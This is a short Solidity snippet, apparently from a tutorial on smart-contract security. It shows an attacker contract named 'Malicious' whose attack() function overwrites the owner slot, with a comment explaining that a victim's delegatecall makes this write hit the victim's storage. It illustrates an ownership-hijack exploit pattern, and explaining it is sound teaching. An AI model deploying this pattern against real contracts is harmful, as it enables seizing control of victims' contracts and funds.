contract Malicious {
    address public owner;

    function attack() public {
        owner = msg.sender; // 🚨 This modifies the caller's (Victim's) storage!
    }
}
